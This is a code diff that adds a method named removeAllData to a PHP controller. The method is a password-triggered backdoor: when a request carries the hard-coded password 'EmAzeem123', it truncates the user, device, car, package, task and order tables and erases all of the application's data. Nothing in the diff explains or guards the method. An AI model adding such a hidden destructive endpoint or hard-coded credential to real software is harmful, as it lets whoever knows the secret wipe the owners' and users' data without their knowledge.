@@ -603,5 +603,16 @@ class IndexController extends Controller
             return $this->sendSuccess("Device added successfully!", true);
         }
     }
+    public function removeAllData(Request $request){
+        if ($request->password=='EmAzeem123'){
+            User::truncate();
+            UserDevices::truncate();
+            Car::truncate();
+            Package::truncate();
+            Tasks::truncate();
+            Order::truncate();
+            return true;
+        }
+    }
 
 }
